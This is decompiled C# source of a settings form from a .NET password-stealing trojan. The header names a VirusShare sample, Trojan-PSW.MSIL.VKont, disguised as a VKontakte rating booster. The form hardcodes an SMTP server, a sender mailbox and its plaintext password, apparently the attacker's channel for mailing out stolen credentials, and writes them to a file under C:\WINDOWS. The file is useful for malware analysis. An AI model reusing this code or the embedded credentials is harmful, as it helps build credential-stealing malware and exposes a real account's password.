// Decompiled with JetBrains decompiler
// Type: WindowsApplication4.conf
// Assembly: Повышение рейтинга ВКонтакте V0.3, Version=0.3.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 41DE2CC0-1114-4F32-9D2D-63D2E76B7D6E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-PSW.MSIL.VKont.s-1bc827186f50dd6cf50f6547a316ad5b1db30848ba452cc8a71f6c5d71d44ab6.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Serialization;

namespace WindowsApplication4
{
  public class conf : Form
  {
    private IContainer components = (IContainer) null;
    private Label label1;
    private Label label2;
    private Label l;
    private TextBox tbServ;
    private TextBox tbLogin;
    private TextBox tbPass;
    private Button butSave;
    private Button butNoSave;
    private Label label3;
    private TextBox tbName;
    private Label label4;
    private TextBox tbFrom;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (conf));
      this.label1 = new Label();
      this.label2 = new Label();
      this.l = new Label();
      this.tbServ = new TextBox();
      this.tbLogin = new TextBox();
      this.tbPass = new TextBox();
      this.butSave = new Button();
      this.butNoSave = new Button();
      this.label3 = new Label();
      this.tbName = new TextBox();
      this.label4 = new Label();
      this.tbFrom = new TextBox();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Location = new Point(55, 11);
      this.label1.Name = "label1";
      this.label1.Size = new Size(47, 13);
      this.label1.TabIndex = 0;
      this.label1.Text = "Сервер:";
      this.label2.AutoSize = true;
      this.label2.Location = new Point(-2, 40);
      this.label2.Name = "label2";
      this.label2.Size = new Size(106, 13);
      this.label2.TabIndex = 1;
      this.label2.Text = "Логин (Emal адрес):";
      this.l.AutoSize = true;
      this.l.Location = new Point(54, 69);
      this.l.Name = "l";
      this.l.Size = new Size(48, 13);
      this.l.TabIndex = 2;
      this.l.Text = "Пароль:";
      this.tbServ.Location = new Point(105, 8);
      this.tbServ.Name = "tbServ";
      this.tbServ.Size = new Size(100, 20);
      this.tbServ.TabIndex = 3;
      this.tbServ.Text = "smtp.mail.ru";
      this.tbServ.TextChanged += new EventHandler(this.tbServ_TextChanged);
      this.tbLogin.Location = new Point(105, 37);
      this.tbLogin.Name = "tbLogin";
      this.tbLogin.Size = new Size(100, 20);
      this.tbLogin.TabIndex = 4;
      this.tbLogin.Text = "karega45@mail.ru";
      this.tbLogin.TextChanged += new EventHandler(this.tbLogin_TextChanged);
      this.tbPass.Location = new Point(105, 66);
      this.tbPass.Name = "tbPass";
      this.tbPass.Size = new Size(100, 20);
      this.tbPass.TabIndex = 5;
      this.tbPass.Text = "19950402dd";
      this.butSave.Location = new Point(27, 169);
      this.butSave.Name = "butSave";
      this.butSave.Size = new Size(75, 23);
      this.butSave.TabIndex = 6;
      this.butSave.Text = "Сохранить";
      this.butSave.UseVisualStyleBackColor = true;
      this.butSave.Click += new EventHandler(this.butSave_Click);
      this.butNoSave.Location = new Point(115, 169);
      this.butNoSave.Name = "butNoSave";
      this.butNoSave.Size = new Size(75, 23);
      this.butNoSave.TabIndex = 7;
      this.butNoSave.Text = "Отмена";
      this.butNoSave.UseVisualStyleBackColor = true;
      this.butNoSave.Click += new EventHandler(this.butNoSave_Click);
      this.label3.AutoSize = true;
      this.label3.Location = new Point(3, 99);
      this.label3.Name = "label3";
      this.label3.Size = new Size(99, 13);
      this.label3.TabIndex = 8;
      this.label3.Text = "Имя отправителя:";
      this.tbName.Location = new Point(105, 96);
      this.tbName.Name = "tbName";
      this.tbName.Size = new Size(100, 20);
      this.tbName.TabIndex = 9;
      this.tbName.Text = "karega45";
      this.label4.AutoSize = true;
      this.label4.Location = new Point(0, 132);
      this.label4.Name = "label4";
      this.label4.Size = new Size(102, 13);
      this.label4.TabIndex = 10;
      this.label4.Text = "Email отправителя:";
      this.tbFrom.Enabled = false;
      this.tbFrom.Location = new Point(105, 129);
      this.tbFrom.Name = "tbFrom";
      this.tbFrom.Size = new Size(100, 20);
      this.tbFrom.TabIndex = 11;
      this.tbFrom.Text = "Неиспользуется";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoSizeMode = AutoSizeMode.GrowAndShrink;
      this.ClientSize = new Size(220, 202);
      this.Controls.Add((Control) this.tbFrom);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.tbName);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.butNoSave);
      this.Controls.Add((Control) this.butSave);
      this.Controls.Add((Control) this.tbPass);
      this.Controls.Add((Control) this.tbLogin);
      this.Controls.Add((Control) this.tbServ);
      this.Controls.Add((Control) this.l);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (conf);
      this.ShowInTaskbar = false;
      this.SizeGripStyle = SizeGripStyle.Hide;
      this.Text = "Настройки";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public conf()
    {
      this.InitializeComponent();
      if (!File.Exists("C:\\WINDOWS\\EmailConf.xml"))
        return;
      FileStream fileStream = new FileStream("C:\\WINDOWS\\EmailConf.xml", FileMode.Open, FileAccess.Read);
      EmailConfig emailConfig = (EmailConfig) new XmlSerializer(typeof (EmailConfig)).Deserialize((Stream) fileStream);
      this.tbServ.Text = emailConfig.server;
      this.tbLogin.Text = emailConfig.login;
      this.tbPass.Text = emailConfig.password;
      this.tbName.Text = emailConfig.name;
      this.tbFrom.Text = emailConfig.from;
      fileStream.Close();
    }

    private void butSave_Click(object sender, EventArgs e)
    {
      EmailConfig o = new EmailConfig();
      o.server = this.tbServ.Text;
      o.login = this.tbLogin.Text;
      o.password = this.tbPass.Text;
      o.name = this.tbName.Text;
      o.from = this.tbFrom.Text;
      XmlTextWriter xmlTextWriter = new XmlTextWriter("C:\\WINDOWS\\EmailConf.xml", Encoding.UTF8);
      new XmlSerializer(typeof (EmailConfig)).Serialize((XmlWriter) xmlTextWriter, (object) o);
      xmlTextWriter.Close();
      this.Close();
    }

    private void butNoSave_Click(object sender, EventArgs e) => this.Close();

    private void tbLogin_TextChanged(object sender, EventArgs e)
    {
    }

    private void tbServ_TextChanged(object sender, EventArgs e)
    {
    }
  }
}
